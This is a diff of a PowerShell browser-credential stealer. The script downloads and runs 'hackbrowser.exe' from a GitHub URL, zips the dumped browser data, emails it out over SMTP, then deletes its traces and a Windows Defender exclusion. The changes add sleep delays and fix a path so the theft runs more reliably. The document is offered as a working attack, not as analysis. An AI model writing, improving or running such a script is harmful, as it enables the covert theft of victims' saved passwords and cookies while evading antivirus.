@@ -8,8 +8,8 @@ mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest -Uri "https://github.com/david26099/allc-scripts/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
-cd $env:appdata\Local\dump
 ./hb.exe
+Start-Sleep -Seconds 6
 Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
@@ -31,8 +31,12 @@ $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
+Start-Sleep -Seconds 6
 cd "$env:appdata"
 Remove-Item -Path "$env:appdata\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
+
+
+
 
 
